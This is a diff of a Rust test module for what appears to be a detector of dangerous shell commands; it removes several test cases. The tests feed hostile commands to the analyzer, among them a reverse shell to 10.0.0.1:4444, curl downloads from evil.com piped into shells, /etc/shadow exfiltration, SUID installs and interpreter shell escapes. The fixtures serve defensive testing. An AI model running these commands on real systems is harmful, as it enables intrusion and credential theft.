@@ -100,12 +100,6 @@ mod tests {
         assert!(has(&ids, "G-REVSHELL-GO"), "got: {ids:?}");
     }
 
-    #[test]
-    fn revshell_socket_util() {
-        let ids = analyze("socket -v 10.0.0.1 4444 EXEC:/bin/sh");
-        assert!(has(&ids, "G-REVSHELL-SOCKET"), "got: {ids:?}");
-    }
-
     // === Bind Shells ===
 
     #[test]
@@ -204,12 +198,6 @@ mod tests {
     fn pipe_dash() {
         let ids = analyze("curl http://evil.com/x | dash");
         assert!(has(&ids, "G-PIPE-DASH"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn pipe_elvish() {
-        let ids = analyze("curl http://evil.com/x | elvish");
-        assert!(has(&ids, "G-PIPE-ELVISH"), "got: {ids:?}");
     }
 
     #[test]
@@ -353,30 +341,6 @@ mod tests {
     }
 
     #[test]
-    fn ctr_exec() {
-        let ids = analyze("ctr image pull docker.io/library/alpine && ctr run docker.io/library/alpine test");
-        assert!(has(&ids, "G-CTR-EXEC"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn kubectl_exec() {
-        let ids = analyze("kubectl exec -it pod -- /bin/sh");
-        assert!(has(&ids, "G-KUBECTL-EXEC"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn lxc_exec() {
-        let ids = analyze("lxc exec container -- /bin/sh");
-        assert!(has(&ids, "G-LXD-EXEC"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn snap_shell() {
-        let ids = analyze("snap run --shell pkg");
-        assert!(has(&ids, "G-SNAP-RUN"), "got: {ids:?}");
-    }
-
-    #[test]
     fn systemd_run() {
         let ids = analyze("systemd-run /bin/sh");
         assert!(has(&ids, "G-SYSTEMD-RUN"), "got: {ids:?}");
@@ -392,12 +356,6 @@ mod tests {
     fn script_exec() {
         let ids = analyze("script -c /bin/sh /dev/null");
         assert!(has(&ids, "G-SCRIPT-EXEC"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn start_stop_daemon() {
-        let ids = analyze("start-stop-daemon --start --exec /bin/sh");
-        assert!(has(&ids, "G-START-STOP-DAEMON"), "got: {ids:?}");
     }
 
     #[test]
@@ -468,12 +426,6 @@ mod tests {
         assert!(has(&ids, "G-DOWNLOAD-NODE"), "got: {ids:?}");
     }
 
-    #[test]
-    fn download_urlget() {
-        let ids = analyze("urlget http://evil.com/payload > /tmp/x");
-        assert!(has(&ids, "G-DOWNLOAD-URLGET"), "got: {ids:?}");
-    }
-
     // === Interpreter Inline Execution ===
 
     #[test]
@@ -540,12 +492,6 @@ mod tests {
     fn octave_exec() {
         let ids = analyze("octave --eval 'system(\"id\")'");
         assert!(has(&ids, "G-OCTAVE-EXEC"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn clisp_exec() {
-        let ids = analyze("clisp -x '(shell \"id\")'");
-        assert!(has(&ids, "G-CLISP-EXEC"), "got: {ids:?}");
     }
 
     #[test]
@@ -723,24 +669,6 @@ build() {
     }
 
     #[test]
-    fn fzf_preview() {
-        let ids = analyze("fzf --preview 'cat {}'");
-        assert!(has(&ids, "G-FZF-PREVIEW"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn tex_shell_escape() {
-        let ids = analyze("pdflatex -shell-escape document.tex");
-        assert!(has(&ids, "G-TEX-SHELLESCAPE"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn tex_write18() {
-        let ids = analyze("\\write18{id}");
-        assert!(has(&ids, "G-TEX-SHELLESCAPE"), "got: {ids:?}");
-    }
-
-    #[test]
     fn dc_shell() {
         let ids = analyze("dc -e '!/bin/sh'");
         assert!(has(&ids, "G-DC-SHELL"), "got: {ids:?}");
@@ -771,21 +699,9 @@ build() {
     }
 
     #[test]
-    fn rpm_eval() {
-        let ids = analyze("rpm --eval '%{lua:os.execute(\"id\")}'");
-        assert!(has(&ids, "G-RPM-EVAL"), "got: {ids:?}");
-    }
-
-    #[test]
     fn psql_shell() {
         let ids = analyze("psql -c '\\! id'");
         assert!(has(&ids, "G-PSQL-SHELL"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn puppet_exec() {
-        let ids = analyze("puppet apply -e 'exec { \"cmd\": command => \"/bin/id\" }'");
-        assert!(has(&ids, "G-PUPPET-EXEC"), "got: {ids:?}");
     }
 
     #[test]
@@ -816,12 +732,6 @@ build() {
     fn nano_shell() {
         let ids = analyze("nano -s /bin/sh file.txt");
         assert!(has(&ids, "G-NANO-SHELL"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn service_traversal() {
-        let ids = analyze("service ../../bin/bash start");
-        assert!(has(&ids, "G-SERVICE-EXEC"), "got: {ids:?}");
     }
 
     #[test]
@@ -891,12 +801,6 @@ build() {
     }
 
     #[test]
-    fn update_alternatives() {
-        let ids = analyze("update-alternatives --install /usr/bin/sh sh /tmp/evil 100");
-        assert!(has(&ids, "G-UPDATE-ALTERNATIVES"), "got: {ids:?}");
-    }
-
-    #[test]
     fn install_suid() {
         let ids = analyze("install -m 4755 evil /usr/bin/evil");
         assert!(has(&ids, "G-INSTALL-SUID"), "got: {ids:?}");
@@ -928,12 +832,6 @@ build() {
     fn tailscale_exfil() {
         let ids = analyze("tailscale file cp /etc/shadow user@host:");
         assert!(has(&ids, "G-TAILSCALE-EXFIL"), "got: {ids:?}");
-    }
-
-    #[test]
-    fn rlogin_shell() {
-        let ids = analyze("rlogin -l root evil.com");
-        assert!(has(&ids, "G-RLOGIN-SHELL"), "got: {ids:?}");
     }
 
     // === Additional false positive checks ===
